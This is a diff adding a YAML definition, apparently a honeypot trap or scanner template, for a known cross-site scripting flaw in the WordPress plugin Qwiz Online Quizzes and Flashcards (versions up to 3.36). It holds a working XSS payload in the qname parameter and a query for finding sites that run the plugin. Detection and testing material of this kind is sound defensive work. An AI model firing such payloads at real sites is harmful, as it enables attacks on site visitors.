@@ -1,0 +1,29 @@
+id: wp-qwiz-online-xss
+info:
+  name: Qwiz Online Quizzes And Flashcards <= 3.36 - Cross-Site Scripting
+  author: r3Y3r53
+  description: 'The qname, i_qwiz, session_id and username parameters passed to the
+    registration_complete.php file are affected by XSS issues.
+
+    '
+  severity: medium
+  remediation: Fixed in version 3.37
+  reference:
+  - https://wpscan.com/vulnerability/d3c10f69-87b6-43fd-bcbc-c2d35b683ff4
+  - https://packetstormsecurity.com/files/154403/
+  - https://wordpress.org/plugins/qwiz-online-quizzes-and-flashcards/
+  metadata:
+    verified: true
+    max-request: 1
+    publicwww-query: /wp-content/plugins/qwiz-online-quizzes-and-flashcards/
+  tags: wordpress,wp-plugin,wp,wpscan,packetstorm,qwiz-online-quizzes-and-flashcards,xss
+traps:
+- request:
+    method: GET
+    path: /wp-content/plugins/qwiz-online-quizzes-and-flashcards/registration_complete.php?&qname=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+    headers: {}
+    body: ''
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
